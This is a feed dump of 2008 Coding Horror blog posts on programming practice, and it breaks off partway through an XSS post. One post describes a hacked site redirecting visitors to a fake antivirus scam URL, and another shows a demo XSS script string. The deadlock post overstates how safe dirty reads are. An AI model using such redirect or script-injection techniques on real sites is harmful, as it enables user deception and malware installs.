I'm not big on scheduling -- or lists -- but without the latter, I <i>cannot</i> have the former. It's like trying to defy the law of gravity. Thus, on our project, <b>we're always 90% done</b>. If you'd like escape the 90% done ghetto on <i>your</i> software project, don't learn this the hard way, like I did. Every time someone asks you what your schedule is, you should be able to point to a list of everything you need to do. And if you can't -- the first item on your task list should be to <i>create</i> that list.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/on-our-project-were-always-90-done/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Music to (Not) Code By ]]></title>
<link>https://blog.codinghorror.com/music-to-not-code-by/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Occasionally people will ask me <strong>what kind of music I like to code by</strong>. I'm not sure I am the right person to ask this question of.</p>
<p>Allow me to explain by citing my <a href="http://www.amazon.com/review/R10BDZWXGTWNY1/ref=cm_cr_rdp_perm">2001 Amazon review</a> of <a href="http://www.amazon.com/dp/B0000063EG/?tag=codihorr-20">a particular album</a>.</p>
<blockquote>It all started so innocently. I purchased this CD on a lark in mid 1998.
<p><a href="http://www.amazon.com/dp/B0000063EG/?tag=codihorr-20"><img alt="image placeholder" >
<p>Subsequently, I put on this CD at high volume to torture my then-coworkers. It became a running joke. We'd take any opportunity, any pretext at all, to put it on. It had to be played at least once every day for "good luck." We'd force each other to listen to it. We'd have little contests to see who was man enough to listen to it over and over and still silently sit there programming away, not complaining. Sometimes we'd sing along to enhance the effect.</p>
<p>In short: we broke people. It was like a Vietnamese prison camp in stereo.</p>
<p>It was a joke. But then a very strange thing happened -- as I listened to the CD over and over, <em>I began to like it.</em> I mean really like it! I began to listen to it at home on my own time. "There's something about this music", I thought, as I listened to it for the 543rd time. "Maybe it's so bad, it has actually wrapped all the way around and it's.. good again?". I played the album for my wife. At that point I was hooked. I knew all the words to "Having my Baby", and.. I liked it!</p>
</blockquote>
<p>For completeness, here's the track list. If you have any kind of musical taste, you may want to look away from the screen momentarily.</p>
<ol>
<li>Tie A Yellow Ribbon Round The Ole Oak Tree - Dawn</li>
<li>The Night Chicago Died - Paper Lace</li>
<li>Billy, Don't Be A Hero - Bo Donaldson &amp; The Heywoods</li>
<li>(You're) Having My Baby - Paul Anka</li>
<li>Playground In My Mind - Clint Holmes</li>
<li>Feelings - Morris Albert</li>
<li>Sometimes When We Touch - Dan Hill</li>
<li>The Candy Man - Sammy Davis, Jr.</li>
<li>Afternoon Delight - Starland Vocal Band</li>
<li>Torn Between Two Lovers - Mary MacGregor</li>
<li>Escape (The Pina Colada Song) - Rupert Holmes</li>
<li>Muskrat Love - Captain &amp; Tennille</li>
</ol>
<p><s>(An anonymous commenter was kind enough to create a <a href="http://www.mixwit.com/widgets/e65bc88e4706d1652b3c845336fc4acc">Mixwit "mix tape" web page of the above songs</a>, if you're feeling masochistic and want to hear them yourself. Or sadistic, I guess, if you manage to broadcast this music to your coworkers somehow. Not that I would officially endorse said action in any possible way, of course!)</s></p>
<p><a href="http://www.youtube.com/watch?v=rBL2kzKg4nY&amp;list=PLyxjICGrmtVF_i5YPxDI3P5PhT1O4v_iZ"><img alt="image placeholder" >
<p>
(Update: Fixed with <a href="http://www.youtube.com/watch?v=rBL2kzKg4nY&amp;list=PLyxjICGrmtVF_i5YPxDI3P5PhT1O4v_iZ">modern YouTube playlist</a>. Music licensing is the hardest problem in computer science!)
</p>
<p>In a peculiar twist of fate, one of my then coworkers, Geoff, now works with me on Stack Overflow. He can confirm that what I said above actually happened, although I'm not sure you could make something like that up. Apparently his mind wasn't totally destroyed by exposure to this "music". As far as we know.</p>
<p>While I've mentioned mild forms of coworker griefing -- er, I mean, teambuilding -- before in <a href="http://www.codinghorror.com/blog/archives/000997.html">Don't Forget to Lock Your Computer</a>, I thought this audio form was unique.</p>
<p>What I didn't know <em>then</em> is that <strong>this sort of musical griefing had a precedent</strong>. It's documented in the 1994 book <a href="http://www.amazon.com/dp/0029356717/?tag=codihorr-20">Show Stopper! The Breakneck Race to Create Windows NT and the Next Generation at Microsoft</a>. I didn't get around to reading this excellent book <a href="http://www.codinghorror.com/blog/archives/000060.html">until 2004</a>, but it's right there in black and white:</p>
<blockquote>[David] Cutler camped in the Build Lab now, scrutinizing the check-ins, so [Kyle] Shannon wanted him to be comfortable. After further musical experiments, he finally hit on a sound that pleased Cutler. It was a raucous album by the rock group <a href="http://en.wikipedia.org/wiki/Journey_(band)">Journey</a>. One morning Shannon slapped on Journey, and heavy metal sounds filled the lab. Cutler started bobbing his head, humming to the cacophony. Shannon smiled. Nodding gratefully, Cutler promised to share with the builders a couple of his own favorite albums.
<p>He didn't have any favorite albums, but he saw a chance to relieve tension. That night he asked his companion, Deborah Girdler, to visit a CD store and buy something "really bad." She returned with two discs: <a href="http://en.wikipedia.org/wiki/Jim_Nabors">Jim Nabors</a> (star of the 1960s TV series <em>Gomer Pyle, U.S.M.C.</em>) singing gospel tunes and the fantasy characters <a href="http://en.wikipedia.org/wiki/Alvin_and_the_Chipmunks">Alvin and the Chipmunks</a> singing children's songs. Perfect, Cutler thought.</p>
<p>The next day Cutler treated his builders to Nabors singing "In the Sweet Bye and Bye," "Onward Christian Soldiders" and other hymns. When Cutler sang along, everyone cringed; it was hard to tell which was more loathesome -- Nabors gone gospel or Cutler gone musical. No one cheered when Cutler asked to hear the Nabors disc over and over again, day after day.</p>
<p>Before long Shannon and the builders regretted ever awakening Cutler's musicality. They finally hid the Nabors disc on the floor under a desk. When Cutler asked for it, Shannon invariably said "It's in my car." Cutler, who caught the lie, laughed and laughed.</p>
</blockquote>
<p>So the next time you ask one of your fellow programmers to put on some background coding music for the team, think twice. That's all I'm saying.</p>
<p>Now if you'll excuse me, I'm going to slip on <a href="http://www.codinghorror.com/blog/archives/000463.html">my headphones</a> and get back to coding while listening to one of my favorite albums, <a href="http://www.amazon.com/dp/B0006J2G9I/?tag=codihorr-20">The Transformed Man</a>.</p>
<p><a href="http://www.youtube.com/results?search_query=shatner+tambourine+man"><em>Hey, Mr. Tambourine Man, play a song for me ...</em></a></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-09T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/music-to-not-code-by/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Secrets of the JavaScript Ninjas ]]></title>
<link>https://blog.codinghorror.com/secrets-of-the-javascript-ninjas/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
One of the early technology decisions we made on Stack Overflow was to <a href="http://blog.stackoverflow.com/2008/06/is-it-ok-to-require-javascript/">go with a fairly JavaScript intensive site</a>. Like many programmers, I've been historically ambivalent about JavaScript:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/000661.html">The Power of "View Source"</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000509.html">The Day Performance Didn't Matter Any More</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000848.html">JavaScript and HTML: Forgiveness by Default</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000857.html">JavaScript: The Lingua Franca of the Web</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/001023.html">The Great Browser JavaScript Showdown</a>
</li>
</ul>
<p>
However, it's difficult to argue with the demonstrated success of JavaScript over the last few years. JavaScript code has gone from being a peculiar website oddity to -- dare I say it -- delivering useful core features on websites I visit on a daily basis. Paul Graham had <a href="http://www.paulgraham.com/web20.html">this to say</a> on the definition of Web 2.0 in 2005:
</p>
<p>
</p>
<blockquote>
One ingredient of its meaning is certainly Ajax, which I can still only just bear to use without scare quotes. Basically, what "Ajax" means is "Javascript now works." And that in turn means that web-based applications can now be made to work much more like desktop ones.
</blockquote>
<p>
Three years on, I can't argue the point: <b>JavaScript now works</b>. Just look around you on the web.
</p>
<p>
Well, to a point. We can no longer luxuriate in the -- and to be clear, I mean this ironically -- <a href="http://www.codinghorror.com/blog/archives/000606.html">golden age of Internet Explorer 6</a>. We live in a brave new era of <a href="http://www.codinghorror.com/blog/archives/001006.html">increasing browser competition</a>, and that's a good thing. Yes, JavaScript is now mature enough and ubiquitous enough and fast enough to be a viable client programming runtime. But this vibrant browser competition also means there are <b>hundreds of aggravating differences in JavaScript implementations</b> between Opera, Safari, Internet Explorer, and Firefox. And that's just the big four. It is <i>excruciatingly</i> painful to write and test your complex JavaScript code across (n) browsers and (n) operating systems. It'll make you pine for the good old days of HTML 4.0 and CGI.
</p>
<p>
But now something else is happening, something arguably even more significant than "JavaScript now works". The rise of commonly available JavaScript frameworks means you can <b>write to higher level JavaScript APIs that are guaranteed to work across multiple browsers</b>. These frameworks spackle over the JavaScript implementation differences between browsers, and they've (mostly) done all the ugly grunt work of testing their APIs and validating them against a host of popular browsers and plaforms.
</p>
<p>
</p>
<p>
The JavaScript Ninjas have delivered their secret and ultimate weapon: common APIs. They transform working with JavaScript from an unpleasant, write-once-debug-everywhere chore into something that's actually -- dare I say it -- <i>fun</i>.
</p>
<p>
<a href="http://www.manning.com/resig/"><img alt="image placeholder" >
</p>
<p>
Frankly, it is foolish to even <i>consider</i> rolling your own JavaScript code to do even the most trivial of things in a browser now. Instead, <b>choose one of these mature, widely tested JavaScript API frameworks. Spend a little time learning it.</b> You'll ultimately write less code that does more -- and (almost) never have to worry a lick about browser compatibility. It's basically <a href="http://www.west-wind.com/WebLog/posts/370180.aspx">browser coding nirvana, as Rick Strahl noted</a>:
</p>
<p>
</p>
<blockquote>
I've kind of fallen into a couple of very client heavy projects and jQuery is turning out to be a key part in these particular projects. jQuery is definitely one of those tools that has got me really excited as it has changed my perspective in Web Development considerably from dreading doing client development to actually looking forward to applying richer and more interactive client principles.
</blockquote>
<p>
There are several popular Javascript API frameworks to choose from:
</p>
<p>
</p>
<ol>
<li>
<a href="http://www.prototypejs.org/">Prototype</a> and <a href="http://en.wikipedia.org/wiki/Script.aculo.us">Script.aculo.us</a>
</li>
<li>
<a href="http://en.wikipedia.org/wiki/JQuery">JQuery</a>
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Yahoo!_UI_Library">Yahoo UI Library</a>
</li>
<li>
<a href="http://extjs.com/">ExtJS</a>
</li>
<li>
<a href="http://dojotoolkit.org/">Dojo</a>
</li>
<li>
<a href="http://mootools.net/">MooTools</a>
</li>
</ol>
<p>
I don't profess to be an expert in any of these. Far from it. But I will echo what Rick said: using JQuery while writing Stack Overflow is probably the only time in my entire career as a programmer that I have <i>enjoyed</i> writing JavaScript code.
</p>
<p>
It's sure pleasant to write code against <b>solid, increasingly standardized JavaScript API libraries</b> that spackle over all those infuriating browser differences.  I, for one, would like to thank <a href="http://ejohn.org/">John Resig</a> and all the other JavaScript Ninjas who share their secrets -- and their frameworks -- with the rest of the community.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-13T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/secrets-of-the-javascript-ninjas/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Perils of FUI: Fake User Interface ]]></title>
<link>https://blog.codinghorror.com/the-perils-of-fui-fake-user-interface/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As a software developer, tell me if you've ever done this:
</p>
<p>
</p>
<ol>
<li>Taken a screenshot of something on the desktop
</li>
<li>Opened it in a graphics program
</li>
<li>Gone off to work on something else
</li>
<li>Upon returning to your computer, attempted to <b>click on the screenshot as if it was an actual program</b>.
</li>
</ol>
<p>
And let's not forget the common <a href="http://www.codinghorror.com/blog/archives/000997.html">goating</a> technique where you take a screenshot of someone's desktop, make it the desktop background, then proceed to hide every UI element on the screen. The anguished cries as users desperately double-triple-quadruple click on pixels that <i>look exactly like real user interfaces</i> can typically be heard for miles.
</p>
<p>
I bring this up to generate some sympathy. I get fooled by my own FUI -- Fake User Interface -- at least once a month. If it can happen to us, it can happen to anyone. Which means FUI can be quite dangerous in the wrong hands. Consider <a href="http://www.ctechsinc.com/">Ryan Meray's</a> story:
</p>
<p>
</p>
<blockquote>
Okay, so here's an interesting one. My girlfriend is researching stuff on lilies, so she's trying to find the website for the Michigan Regional Lily Society.
<p>
The website address is <a href="http://www.mrls.org/">http://www.mrls.org/</a>
</p>
<p>
Feel free and browse there directly, there's nothing wrong with it. But if you don't remember the URL, your first response is to Google it. We google and get this:
</p>
<p>
<a href="http://www.google.com/search?q=Michigan+Regional+Lily+Society">http://www.google.com/search?q=Michigan+Regional+Lily+Society</a>
</p>
<p>
Now, if you're in Firefox, everything is fine. You click that first result, and you get to their website, and you learn about lilies.
</p>
<p>
However, if you are using IE, be aware, you are about to have a Spyware/Virus alert.
</p>
</blockquote>
<p>
Obviously, the poor Michigian Regional Lily Society has fallen prey to website hackers. (Note that it may have been fixed by the time I'm writing this -- but I duplicated everything I'm about to show you.)
</p>
<p>
The first clever point is that <b>the website appears fine if you navigate there directly</b>. The malicious JavaScript code inserted into the page checks the referer and does something different if you arrive there via a web search engine. This means the people who own the website, and never arrive there through Google, would be scratching their heads, wondering what all the fuss is about. So the hack survives longer.
</p>
<p>
But if you do arrive at the MRLS site through a search engine, like <a href="http://www.codinghorror.com/blog/archives/000767.html">a huge percentage of the world does</a>, you're redirected to:
</p>
<p>
<code>http://scanner.antivir64.com/?aff=1050</code>
</p>
<p>
The very first thing this page does is minimize the browser (Firefox 3, in this case) and present us with this JavaScript alert:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm intentionally juxtaposing the browser and the dialog here, but the browser is way off in the very lower right corner of the display and that dialog is smack dab in the middle of the screen. It is not at all clear that the dialog originated from that web page. It's a primitive technique, but it is surprisingly effective.
</p>
<p>
I didn't have the guts to click OK on that dialog; I clicked the close button. The browser then expanded to show this convincing "real time virus scan".
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The static screenshot does not do it justice; the scrollbar moves, the list of files fly by as they are "scanned", and the web page rather successfully simulates an ersatz UI somewhere between Windows XP and Windows Vista. Of course, <i>we</i> know this Fake User Interface is completely invalid, because it is running in the browser, not on our PC. <i>You and I</i> may understand that distinction, but what about your parents? Your wife? Your children? Your less technically savvy friends? <b>Will they understand this scary, authentic looking virus warning coming from an "encrypted secure site" is all a lie?</b>
</p>
<p>
Honestly, whose PC doesn't "run slower than normal"? Maybe I would want to know if my computer is infected with Viruses, Adware or Spyware. It's all part of the <a href="http://www.codinghorror.com/blog/archives/000929.html">culture of fear</a> that security software companies -- and let's be honest, <i>Windows</i> security software companies --  cultivate so they can rake in millions of dollars per year hawking their software. The difference here, of course, is that <b>it's increasingly difficult to tell the good guys from the bad guys</b>. That's the downside of fear as a selling point: it cuts equally well in both directions.
</p>
<p>
Woe betide the poor user who is convinced through the trickery of FUI to install this "antivirus" software. The page does its darndest to <b>convince you to run its payload executable</b>. Any click on the page, no matter where, is interpreted as a download request.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The page also attempts a drive-by download, though those have been auto-blocked for years now.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
It's tempting to put this down as yet another iteration of <a href="http://www.codinghorror.com/blog/archives/000852.html">phishing, the forever hack</a>. To be fair, this is exactly the sort of thing web browser phishing filters were designed to prevent. This site was already in the Firefox 3 phishing filter -- but it was not caught by the Internet Explorer 7 phishing filter, so I reported it.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I am all for phishing filters as another important line of defense, but like all distributed blacklists, they're <a href="http://www.codinghorror.com/blog/archives/001009.html">only so effective</a>.
</p>
<p>
What I'm more concerned about here is how <i>well</i> the user interface was spoofed. The browser FUI was convincing enough to even make me -- possibly the world's most jaded and cynical Windows user -- do a bit of a double-take. How do you protect naive users from cleverly designed FUI exploits like this one? Can you imagine your mother doing a web search on flowers -- <i>flowers, for God's sake</i> -- clicking on the search results to a totally legitimate website, and <b>correctly navigating the resulting maze of fake UI, spurious javascript alerts, and download dialogs?</b>
</p>
<p>
I know I can't. As much as I admire distributed phishing blacklist efforts, there's no way they can possibly keep pace with the rapid setup and teardown of hacked websites. How many compromised websites are out there? How many unsophisticated users surf the internet every day?
</p>
<p>
As always, we can lay a big part of the blame at Microsoft's doorstep for <a href="http://www.codinghorror.com/blog/archives/000891.html">not adopting the UNIX policy of non-administrator accounts for regular users</a>. But then again, if the spoofing is good enough, the FUI extra-convincing, even a Linux or OS X user could be coerced into entering their admin password for a "system security scan". Or maybe they just wanted to <a href="http://www.codinghorror.com/blog/archives/000347.html">see the dancing bunnies</a>.
</p>
<p>
And then, like Ryan, you're likely to end up with the same infected computer, and the same distraught spouse. All this for the love of a few lilies.
</p>
<p>
Short of user education, which is a neverending, continuous uphill battle -- <b>how would you combat a perfectly spoofed FUI presented to a naive user?</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-17T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-perils-of-fui-fake-user-interface/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Check In Early, Check In Often ]]></title>
<link>https://blog.codinghorror.com/check-in-early-check-in-often/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I consider this the golden rule of source control:
</p>
<p>
<b>Check in early, check in often</b>.
</p>
<p>
Developers who work for long periods -- and by <i>long</i> I mean more than a day -- without checking anything into source control are setting themselves up for some serious integration headaches down the line. Damon Poole <a href="http://damonpoole.blogspot.com/2005/07/check-in-early-and-check-in-often.html">concurs</a>:
</p>
<p>
</p>
<blockquote>
Developers often put off checking in. They put it off because they don't want to affect other people too early and they don't want to get blamed for breaking the build. But this leads to other problems such as losing work or not being able to go back to previous versions.
<p>
My rule of thumb is "check-in early and often", but with the caveat that you have access to private versioning. If a check-in is immediately visible to other users, then you run the risk of introducing immature changes and/or breaking the build.
</p>
</blockquote>
<p>
I'd much rather have small fragments checked in periodically than to go long periods with no idea whatsoever what my coworkers are writing. As far as I'm concerned, <b>if the code isn't checked into source control, it doesn't exist</b>. I suppose this is yet another form of <a href="http://www.codinghorror.com/blog/archives/001134.html">Don't Go Dark</a>; the code is invisible until it exists in the repository in some form.
</p>
<p>
I'm not proposing developers check in broken code -- but I also argue that there's a big difference between <i>broken</i> code and <i>incomplete</i> code. Isn't it possible, perhaps even desirable, to write your code and structure your source control tree in such a way that you can <b>check your code in periodically as you're building it?</b> I'd much rather have empty stubs and basic API skeletons in place than nothing at all. I can integrate my code against stubs. I can do code review on stubs. I can even help you build out the stubs!
</p>
<p>
But when there's nothing in source control for days or weeks, and then a giant dollop of code is suddenly dropped on the team's doorstep -- none of that is possible.
</p>
<p>
Developers that wouldn't even consider adopting the old-school <a href="http://en.wikipedia.org/wiki/Waterfall_model">waterfall method</a> of software development somehow have no problem adopting essentially the very same model when it comes to their source control habits.
</p>
<p>
Perhaps what we need is a model of <b>software accretion</b>. Start with a tiny fragment of code that does almost nothing. Look on the bright side -- code that does nothing can't have many bugs! Test it, and check it in. Add one more small feature. Test that feature, and check it in. Add another small feature. Test <i>that</i>, and check it in. Daily. Hourly, even. You always have functional software. It may not do much, but it runs. And with every checkin it becomes infinitesimally <i>more</i> functional.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
If you learn to check in early and check in often, you'll have ample time for feedback, integration, and review along the way. And who knows -- you might even manage to accrete that pearl of final code that you were looking for, too.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-20T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/check-in-early-check-in-often/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Deadlocked! ]]></title>
<link>https://blog.codinghorror.com/deadlocked/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
You may have noticed that my posting frequency has declined over the last three weeks. That's because I've been busy building <a href="http://www.codinghorror.com/blog/archives/001101.html">that Stack Overflow thing we talked about</a>.
</p>
<p>
It's going well so far. Joel Spolsky also seems to think <a href="http://www.joelonsoftware.com/items/2008/08/21.html">it's going well</a>, but he's one of the founders so he's <i>clearly</i> biased. For what it's worth, Robert Scoble was <a href="http://scobleizer.com/2008/08/11/pr-less-launch-kicks-off-a-stack-overflow-of-praise/">enthused about Stack Overflow</a>, though it did not <a href="http://scobleizer.com/2008/02/27/what-made-me-cry-microsofts-world-wide-telescope/">make him cry</a>. Still, I was humbled by the way Robert picked this up so enthusiastically through the community. I hadn't contacted him in any way; I myself only found out about his reaction third hand.
</p>
<p>
That's not to say everything has been copacetic. One major surprise in the development of Stack Overflow was this recurring and unpredictable gem:
</p>
<p>
</p>
<blockquote>
Transaction (Process ID 54) was deadlocked on lock resources with another process and has been chosen as the deadlock victim. Rerun the transaction.
</blockquote>
<p>
<a href="http://en.wikipedia.org/wiki/Deadlock">Deadlocks</a> are a classic computer science problem, often taught to computer science students as <a href="http://www.codinghorror.com/blog/archives/000951.html">the Dining Philosophers puzzle</a>.
</p>
<p>
<a href="http://www.packetlog.com/packetlog/2007/12/dining-philosop.html"><img alt="image placeholder" >
</p>
<p>
</p>
<blockquote>
Five philosophers sit around a circular table. In front of each philosopher is a large plate of rice. The philosophers alternate their time between eating and thinking. There is one chopstick between each philosopher, to their immediate right and left. In order to eat, a given philosopher needs to use both chopsticks. How can you ensure all the philosophers can eat reliably without starving to death?
</blockquote>
<p>
Point being, you have two processes that both need access to scarce resources that the other controls, so some sort of locking is in order. Do it wrong, and you have a <b>deadlock</b> -- everyone starves to death. There are lots of scarce resources in a PC or server, but <i>this</i> deadlock is coming from our database, SQL Server 2005.
</p>
<p>
You can <a href="http://www.simple-talk.com/sql/learn-sql-server/how-to-track-down-deadlocks-using-sql-server-2005-profiler/">attach the profiler to catch the deadlock event</a> and see the actual commands that are deadlocking. I did that, and found there was <i>always</i> one particular SQL command involved:
</p>
<p>
</p>
<pre>
UPDATE [Posts]
SET [AnswerCount] = @p1, [LastActivityDate] = @p2, [LastActivityUserId] = @p3
WHERE [Id] = @p0
</pre>
<p>
If it detects a deadlock, SQL Server forces one of the deadlocking commands to lose -- specifically the one that uses the least resources. The statement on the losing side varied, but in our case <b>the losing deadlock statement was always a really innocuous database read</b>, like so:
</p>
<p>
</p>
<pre>
SELECT *
FROM [Posts]
WHERE [ParentId] = @p0
</pre>
<p>
(Disclaimer: above SQL is simplified for the purpose of this post). This deadlock perplexed me, on a couple levels.
</p>
<p>
</p>
<ol>
<li>
<b>How can a read be blocked by a write?</b> What possible contention could there be from merely <i>reading</i> the data? It's as if one of the dining philosophers happened to glance over at another philosoper's plate, and the other philosopher, seeing this, screamed "meal viewing deadlock!" and quickly covered his plate with his hands. Yes, it's ridiculous. I don't want to eat your food -- I just want to look at it.<p></p>
</li>
<li>
<b>We aren't doing that many writes</b>. Like most web apps, we're <i>insanely</i> read-heavy. The particular SQL statement you see above only occurs when someone answers a question. As much as I want to believe Stack Overflow will be this massive, rip-roaring success, there just <i>cannot</i> be that many answers flowing through the system in beta. We went through our code with a fine tooth comb, and yep, we're barely writing anywhere except when users ask a question, edit something, or answer a question.<p></p>
</li>
<li>
<b>What about retries?</b> I find it hard to believe that little write would take so incredibly long that a read would have to wait more than a few milliseconds at most.
</li>
</ol>
<p>
If you aren't <i>eating</i> -- modifying data -- then how can trivial super-fast reads be blocked on rare writes? We've had good results with SQL Server so far, but I found this behavior terribly disappointing. Although these deadlocks were somewhat rare, they still occurred a few times a day, and I'm deeply uncomfortable with errors I don't fully understand. This is the kind of stuff that quite literally keeps me up at night.
</p>
<p>
I'll freely admit this could be due to some peculiarities in our code (translated: we suck), and reading through some <a href="http://www.code-magazine.com/article.aspx?quickid=0309101&amp;page=2">sample SQL traces of subtle deadlock conditions</a>, it's certainly possible. We racked our brains and our code, and couldn't come up with any obvious boneheaded mistakes. While our database <i>is</i> somewhat denormalized, all of our write conditions are relatively rare and hand-optimized to be small and fast. In all honesty, our app is just not all that complex. It ain't rocket surgery.
</p>
<p>
If you ever have to troubleshoot database deadlocks, you'll inevitably discover <a href="http://msdn.microsoft.com/en-us/library/ms187373.aspx">the <code>NOLOCK</code> statement</a>. It works like this:
</p>
<p>
</p>
<pre>
SELECT *
FROM [Posts] <font color="red">with (nolock)</font>
WHERE [ParentId] = @p0
</pre>
<p>
It isn't just a SQL Server command -- it <a href="http://www.sqldba.org/articles/22-mysql-with-nolock.aspx">also applies to Oracle and MySQL</a>. This sets the transaction isolation level to <code>read uncommitted</code>, also known as "dirty reads". It tells the query to use the lowest possible levels of locking.
</p>
<p>
<b>But is nolock dangerous?</b> Could you end up reading invalid data with read uncommitted on? Yes, in theory. You'll find no shortage of database architecture astronauts who start <a href="http://en.wikipedia.org/wiki/ACID">dropping ACID science on you</a> and all but pull the building fire alarm when you tell them you want to try nolock. It's true: the theory is scary. But here's what I think:
</p>
<p>
</p>
<blockquote>
In theory there is no difference between theory and practice. In practice there is.
</blockquote>
<p>
I would never recommend using nolock as a general "good for what ails you" snake oil fix for any database deadlocking problems you may have. You should try to diagnose the source of the problem first.
</p>
<p>
But <i>in practice</i> <b>adding nolock to queries that you absolutely know are simple, straightforward read-only affairs <i>never seems to lead to problems</i></b>. I asked around, and I got advice from a number of people whose opinions and experience I greatly trust and they, to a (wo)man, all told me the same thing: they've <i>never</i> seen any adverse reaction when using nolock. As long as you know what you're doing. One related a story of working with a DBA who told him to add nolock to every query he wrote!
</p>
<p>
With nolock / read uncommitted / dirty reads, data may be out of date at the time you read it, but it's never wrong or garbled or corrupted in a way that will crash you. And honestly, most of the time, <i>who cares?</i> If your user profile page is a few seconds out of date, how could that possibly matter?
</p>
<p>
Adding nolock to every single one of our queries wasn't really an option. We added it to all the ones that seemed safe, but our use of LINQ to SQL made it <a href="http://www.hanselman.com/blog/GettingLINQToSQLAndLINQToEntitiesToUseNOLOCK.aspx">difficult to apply the hint selectively</a>.
</p>
<p>
I'm no DBA, but it seems to me the root of our problem is that the default SQL Server locking strategy is <a href="http://www.databasejournal.com/features/mssql/article.php/3560451">incredibly pessimistic out of the box</a>:
</p>
<p>
</p>
<blockquote>
The database philosophically expects there will be many data conflicts; with multiple sessions all trying to change the same data at the same time and corruption will result. To avoid this, Locks are put in place to guard data integrity ... <b>there are a few instances though, when this pessimistic heavy lock design is more of a negative than a positive benefit, such as applications that have very heavy read activity with light writes</b>.
</blockquote>
<p>
Wow, very heavy read activity with light writes. What does that remind me of? Hmm. Oh yes, <i>that damn website we're building.</i> Fortunately, there is a mode in SQL Server 2005 designed for exactly this scenario: <a href="http://www.databasejournal.com/features/mssql/article.php/3566746">read committed snapshot</a>:
</p>
<p>
</p>
<blockquote>
Snapshots rely on an entirely new data change tracking method ...  more than just a slight logical change, it requires the server to handle the data physically differently. Once this new data change tracking method is enabled, it creates a copy, or snapshot of every data change. By reading these snapshots rather than live data at times of contention, Shared Locks are no longer needed on reads, and overall database performance may increase.
</blockquote>
<p>
I'm a little disappointed that SQL Server treats our silly little web app like it's a banking application. I think it's incredibly telling that a Google search for <a href="http://www.google.com/search?q=" sql>SQL Server deadlocks</a> returns nearly twice the results of a query for <a href="http://www.google.com/search?q=mysql+deadlocks">MySql deadlocks</a>. I'm guessing that MySQL, which grew up on web apps, is much less pessimistic out of the box than SQL Server.
</p>
<p>
I find that deadlocks are difficult to understand and even more difficult to troubleshoot. Fortunately, it's easy enough to fix by setting <code>read committed snapshot</code> on the database for our particular workload. But I can't help thinking our particular database vendor just isn't as <i>optimistic</i> as they perhaps should be.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-08-24T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/deadlocked/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Protecting Your Cookies: HttpOnly ]]></title>
<link>https://blog.codinghorror.com/protecting-your-cookies-httponly/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
So I have this friend. I've told him time and time again <a href="http://blog.stackoverflow.com/2008/06/safe-html-and-xss/">how dangerous XSS vulnerabilities are</a>, and how <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> is now <b>the most common of all publicly reported security vulnerabilities</b> -- dwarfing <a href="http://www.codinghorror.com/blog/archives/000841.html">old standards</a> like buffer overruns and SQL injection. But will he listen? No. He's hard headed. He had to go and write <a href="http://refactormycode.com/codes/333-sanitize-html">his own HTML sanitizer</a>. Because, well, how difficult can it be? How dangerous could this silly little toy scripting language running inside a <i>browser</i> be?
</p>
<p>
As it turns out, far more dangerous than expected.
</p>
<p>
To appreciate just how significant XSS hacks have become, think about how much of your life is lived online, and how exactly the websites you log into on a daily basis know who you are. It's all done with <a href="http://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookies</a>, right? Those tiny little identifiying headers sent up by the browser to the server on your behalf. They're the keys to your identity as far as the website is concerned.
</p>
<p>
Most of the time when you accept input from the user the <i>very first thing you do</i> is pass it through a HTML encoder. So tricksy things like:
</p>
<p>
</p>
<pre>
&lt;script&gt;alert('hello XSS!');&lt;/script&gt;
</pre>
<p>
are automagically converted into their harmless encoded equivalents:
</p>
<pre>
&amp;lt;script&amp;gt;alert('hello XSS!');&amp;lt;/script&amp;gt;
</pre>
<p>
In my friend's defense (not that he deserves any kind of defense) the website he's working on allows some HTML to be posted by users. It's part of the design. It's a difficult scenario, because you can't just clobber every questionable thing that comes over the wire from the user. You're put in the uncomfortable position of having to discern good from bad, and decide what to do with the questionable stuff.
</p>
<p>
